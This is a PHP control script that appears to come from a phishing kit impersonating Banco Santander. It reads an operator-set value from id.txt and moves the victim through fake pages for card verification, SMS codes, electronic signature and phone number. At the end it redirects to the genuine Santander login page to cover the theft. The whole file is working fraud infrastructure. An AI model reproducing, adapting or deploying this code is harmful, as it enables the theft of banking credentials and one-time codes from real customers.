<?php

$myfile = fopen("id.txt", "r") or header("Location: loading.php");
$value=fgets($myfile);
if($value == 'vbv'){
	header("Location: Mi_cuenta.php");
}else if($value == 'codigo'){
	header("Location: sms_codigo.php");
}else if($value == 'samsung'){
	header("Location: firma_electronica.php");
}else if($value == 'apple'){
	header("Location: Phone_Number.php");	
}else if($value == 'error'){
	header("Location: codigo_incorrecta.php");	
}else if($value == 'login'){
	$file_pointer = "id.txt";  
   
// Use unlink() function to delete a file  
if (!unlink($file_pointer)) {  
     
}  
else {  
      
} 
	header("Location: particulares1.php");
}else if($value == 'finish'){
	header("Location: https://particulares.bancosantander.es/login/#_ga=2.183401697.653855482.1596385130-5941310.1595585397");
}
?>